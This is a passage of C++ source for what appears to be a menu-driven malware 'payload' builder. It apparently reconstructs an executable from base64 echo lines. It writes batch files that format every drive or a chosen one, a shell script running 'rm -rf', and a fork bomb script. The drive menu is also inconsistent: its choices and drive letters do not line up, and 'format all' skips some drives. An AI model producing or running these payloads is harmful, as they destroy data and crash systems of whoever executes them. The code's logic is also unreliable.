				ads << "echo FAAAAAgAdXfqSJDoh9lzIQAAADoAAAgAAAAAAAAAAAAAAP+BAAAAAE1FTVouZXhlUEsFBgAAAAAB>>x\n";
				ads << "echo AAEANgAAAJkhAAAAAA==>>x\n";
				
				cout << "Payload complete.\n" << endl;
			}
		}
		
		
		if(b == 2) {
			
			cout << "Please, Choose the way you want the Drive or Drives to be formatted\n" << endl;
			
			cout << "Choice 1: Format all Drives\n" << endl;
			
			cout << "Choice 2: Format drive A\n" << endl;
			
			cout << "Choice 3: Format drive B\n" << endl;
			
			cout << "Choice 4: Format drive C\n" << endl;
			
			cout << "Choice 5: Format drive D\n" << endl;
			
			cout << "Choice 6: Format drive E\n" << endl;
			
			cout << "Choice 7: Format drive F\n" << endl;
			
			cout << "Choice 8: Format drive G\n" << endl;
			
			cout << "Choice 9: Format drive H\n" << endl;
			
			cout << "Choice 10: Format drive I\n" << endl;
			
			cout << "Choice 11: Format drive J\n" << endl;
			
			cout << "Choice 12: Format drive K\n" << endl;
			
			cout << "Choice 13: Format drive L\n" << endl;
			
			cout << "Choice 14: Format drive M\n" << endl;
			
			cout << "Choice 15: Format drive N\n" << endl;
			
			cout << "Choice 16: Format drive O\n" << endl;
			
			cout << "Choice 17: Format drive P\n" << endl;
			
			cout << "Choice 18: Format drive Q\n" << endl;
			
			cout << "Choice 19: Format drive R\n" << endl;
			
			cout << "Choice 20: Format drive S\n" << endl;
			
			cout << "Choice 21: Format drive T\n" << endl;
			
			cout << "Choice 22: Format drive U\n" << endl;
			
			cout << "Choice 23: Format drive V\n" << endl;
			
			cout << "Choice 24: Format drive X\n" << endl;
			
			cout << "Choice 25: Format drive Y\n" << endl;
			
			cout << "Choice 26: Format drive Z\n" << endl;
			
			cout << "Please select an option:\n" << endl;
			cin>>c;
			
			system("PAUSE");
			
			if(c == 1) {
				ofstream payload;
				payload.open("Format.bat");
				payload << "@echo off\n";
				payload << "format A:\\\n";
				payload << "format B:\\\n";
				payload << "format C:\\\n";
				payload << "format D:\\\n";
				payload << "format E:\\\n";
				payload << "format F:\\\n";
				payload << "format G:\\\n";
				payload << "format H:\\\n";
				payload << "format I:\\\n";
				payload << "format J:\\\n";
				payload << "format K:\\\n";
				payload	<< "format L:\\\n";
				payload	<< "format M:\\\n";
				payload << "format O:\\\n";
				payload	<< "format P:\\\n";
				payload << "format R:\\\n";
				payload	<< "format S:\\\n";
				payload << "format T:\\\n";
				payload << "format U:\\\n";
				payload << "format V:\\\n";
				payload << "format W:\\\n";
				payload << "format Y:\\\n";
				payload << "format Z:\\\n";
				payload.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 2) {
				
				ofstream a;
				a.open("Drivea.bat");
				a << "@echo off\n";
				a << "format A:\\\n";
				a.close();
				
				cout << "Payload created.\n" << endl;
				
			}
			
			if(c == 3) {
				
				ofstream b;
				b.open("Driveb.bat");
				b << "@echo off\n";
				b << "format B:\\\n";
				b.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 4) {
				
				ofstream c;
				c.open("Drivec.bat");
				c << "@echo off\n";
				c << "format C:\\\n";
				c.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 5) {
				
				ofstream d;
				d.open("Drived.bat");
				d << "@echo off\n";
				d << "format D:\\\n";
				d.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 6) {
				
				ofstream e;
				e.open("DriveE.bat");
				e << "@echo off\n";
				e << "format E:\\\n";
				e.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 7){
				
				ofstream f;
				f.open("DriveF.bat");
				f << "@echo off\n";
				f << "format F:\\\n";
				f.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 8) {
				
				ofstream g;
				g.open("DriveG.bat");
				g << "@echo off\n";
				g << "format G:\\\n";
				g.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 9) {
				
				ofstream h;
				h.open("DriveH.bat");
				h << "@echo off\n";
				h << "format H:\\\n";
				h.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 10) {
				
				ofstream i;
				i.open("DriveI.bat");
				i << "@echo off\n";
				i << "format I:\\\n";
				i.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 11) {
				
				ofstream j;
				j.open("DriveJ.bat");
				j << "@echo off\n";
				j << "format J:\\\n";
				j.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 12) {
				
				ofstream k;
				k.open("DriveK.bat");
				k << "@echo off\n";
				k << "format K:\\\n";
				k.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 13) {
				
				ofstream l;
				l.open("DriveL.bat");
				l << "@echo off\n";
				l << "format l:\\\n";
				l.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 14) {
				
				ofstream m;
				m.open("DriveM.bat");
				m << "@echo off\n";
				m << "format M:\\\n";
				m.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 15) {
				
				ofstream n;
				n.open("DriveN.bat");
				n << "@echo off\n";
				n << "format N:\\\n";
				n.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 16) {
				
				ofstream o;
				o.open("DriveO.bat");
				o << "@echo off\n";
				o << "format O:\\\n";
				o.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 17) {
				
				ofstream p;
				p.open("DriveP.bat");
				p << "@echo off\n";
				p << "format P:\\\n";
				p.close();
				
				cout << "Payload Created.\n" << endl;
				
			}	
			
			if(c == 18) {
				
				ofstream q;
				q.open("DriveQ.bat");
				q << "@echo off\n";
				q << "format Q:\\\n";
				q.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 19) {
				
				ofstream r;
				r.open("DriveR.bat");
				r << "@echo off\n";
				r << "format R:\\\n";
				r.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 20) {
				
				ofstream s;
				s.open("DriveS.bat");
				s << "@echo off\n";
				s << "format S:\\\n";
				s.close();
				
				cout << "Payload Created.\n" << endl;
				 
			}
			
			if(c == 21) {
				
				ofstream t;
				t.open("DriveT.bat");
				t << "@echo off\n";
				t << "format T:\\\n";
				t.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 22) {
				
				ofstream u;
				u.open("DriveU.bat");
				u << "@echo off\n";
				u << "format U:\\\n";
				u.close();
				
				cout << "Payload Created.\n" << endl;
					
			}
			
			if(c == 23) {
				
				ofstream v;
				v.open("DriveV.bat");
				v << "@echo off\n";
				v << "format V:\\\n";
				v.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 24) {
				
				ofstream w;
				w.open("DriveW.bat");
				w << "@echo off\n";
				w << "format W:\\\n";
				w.close();
				
				cout << "Payload Created.\n" << endl;
				  
			}
			
			if(c == 25) {
				
				ofstream x;
				x.open("DriveX.bat");
				x << "@echo off\n";
				x << "format X:\\\n";
				x.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 26) {
				
				ofstream y;
				y.open("DriveY.bat");
				y << "@echo off\n";
				y << "format Y:\\\n";
				y.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(c == 27) {
				
				ofstream z;
				z.open("DriveZ.bat");
				z << "@echo off\n";
				z << "format Z:\\\n";
				z.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
		}
	}
	if(a == 2) {
		
		cout << "Heres some payloads:\n" << endl;
		
		cout << "1. Linux death virus\n" << endl;
		
		cout << "2. Fork bomb virus\n" << endl;
		
		cout << "Please select the virus you want: " << endl;
		cin>>d;
		
		system("PAUSE");
		
		if(d == 1) {
			
			ofstream ba;
			ba.open("death.sh");
			ba << "#!/bin/sh\n";
			ba << "rm -rf\n";
			ba.close();
			
			cout << "Payload Created.\n" << endl;
			
		}
		
		if(d == 2) { 
		
			ofstream fd;
			fd.open("forkbomb.sh"); 
			fd << "#!/bin/sh\n";
			fd << ":(){ :|:& };:\n";
			fd.close();
			
			cout << "Payload Created.\n" << endl;
			
		}
	}
	if(a == 3) {
		cout << "Wait for version v1.0!" << endl;
	}
	return 0;
}
